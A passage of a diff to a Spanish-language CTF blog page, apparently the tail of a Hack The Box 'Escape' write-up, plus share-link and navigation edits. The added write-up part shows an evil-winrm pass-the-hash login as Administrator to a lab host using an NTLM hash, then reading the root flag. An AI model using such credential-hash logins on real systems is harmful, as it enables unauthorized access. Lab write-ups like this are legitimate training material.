+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> Administrator <span class="nt">-H</span> A52F78E4C751E5F5E17E1E9F3E58F4EE
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Procedemos a leer la flag.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/root.txt
+146a3dc7812a7b839f482285b6701f3b
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><img data-src="/assets/img/commons/escape-writeup/hacker.gif" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>ERROLOG.BAK</em></p>
 
 </div>
 
@@ -840,19 +2295,19 @@
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=EscapeWriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fescape-writeup%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=Escape+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fescape-writeup%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=EscapeWriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fescape-writeup%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Escape+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fescape-writeup%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fescape-writeup%2F&text=EscapeWriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fescape-writeup%2F&text=Escape+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -1541,6 +2996,14 @@
 
 
 
+<!-- BS-toc.js will be loaded at medium priority -->
+<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
+  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
+  <nav id="toc" data-toggle="toc"></nav>
+</div>
+
 
     
   </div>
@@ -1576,98 +3039,98 @@
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1913,17 +3376,17 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/metatwo-writeup/" class="btn btn-outline-primary"
+  <a href="/posts/interface-writeup/" class="btn btn-outline-primary"
     prompt="Anterior">
-    <p>MetaTwo WriteUp</p>
+    <p>Interface WriteUp</p>
   </a>
   
 
   
-  <a href="/posts/broscience-writeup/" class="btn btn-outline-primary"
+  <div class="btn btn-outline-primary disabled"
     prompt="Nuevo">
-    <p>BroScience WriteUp</p>
-  </a>
+    <p>-</p>
+  </div>
   
 
 </div>
